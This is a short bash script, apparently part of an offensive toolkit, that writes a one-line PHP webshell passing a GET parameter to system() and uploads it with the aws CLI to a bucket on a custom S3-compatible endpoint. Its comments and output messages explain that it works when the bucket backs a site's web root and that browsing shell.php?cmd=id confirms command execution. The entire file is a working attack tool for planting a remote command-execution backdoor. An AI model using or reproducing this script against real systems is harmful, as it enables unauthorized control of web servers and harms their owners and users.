#!/usr/bin/env bash
# Writes a minimal PHP webshell locally and uploads it to a bucket via a
# custom S3-compatible endpoint (MinIO etc.). Only useful when that bucket
# actually backs a website's web root — enumerate with s3-object-list first
# to confirm (look for index.php or similar in the listing).
set -uo pipefail

endpoint_url="$1"
bucket="${2%/}"
output_dir="$3"
shell_path="$output_dir/shell.php"

printf '%s' '<?php system($_GET["cmd"]); ?>' > "$shell_path"
echo "[+] Wrote webshell to $shell_path (GET parameter: cmd)"

aws --endpoint-url="$endpoint_url" s3 cp "$shell_path" "s3://$bucket/shell.php"
status=$?
if [ $status -eq 0 ]; then
  echo "[+] Uploaded to s3://$bucket/shell.php — if this bucket backs the site's web root," \
       "browse .../shell.php?cmd=id to confirm execution."
else
  echo "[-] Upload failed (exit $status)"
fi
exit $status
